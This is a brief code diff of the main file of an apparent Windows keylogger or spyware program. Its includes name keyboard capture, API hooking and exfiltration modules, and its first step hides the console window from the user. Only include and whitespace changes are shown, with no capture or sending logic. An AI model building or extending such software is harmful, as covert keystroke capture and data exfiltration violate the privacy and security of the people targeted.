@@ -5,18 +5,15 @@
 #include <Windows.h>
 #include "IO.h"
 #include "Keyboard.h"
-#include "Encoder.h"
+#include "Transformer.h"
 #include "Timer.h"
 #include "Exfiltrate.h"
 #include "APIHook.h"
 #include "Auxiliary.h"
 
-using std::cout;
-
-
 int main()
 {
-    
+   
     //Hide console window from user.
 
     Auxiliary::hideConsole();
